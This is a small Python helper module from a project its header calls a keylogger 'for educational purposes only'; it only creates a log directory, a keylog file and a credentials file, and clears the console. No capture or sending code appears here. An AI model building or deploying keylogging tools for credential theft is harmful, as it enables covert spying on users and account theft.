# This script is a keylogger for educational purposes only.
# Author: @juanmafe.
# GPLv3 2022.

import os
from Properties import Properties

class CheckFile():

	def check_dir():
		if not (os.path.exists(Properties.path_dir)):
			os.mkdir(Properties.path_dir)


	def check_keylog_file():
		CheckFile.check_dir()
		if not (os.path.exists(Properties.path_keylog_file)):
			os.mknod(Properties.path_keylog_file)


	def check_credentials_file():
		CheckFile.check_dir()
		if not (os.path.exists(Properties.path_credentials_file)):
			os.mknod(Properties.path_credentials_file)


	def clear_dirty_console_by_opened_files():
		os.system(Properties.command_clear)

#EOF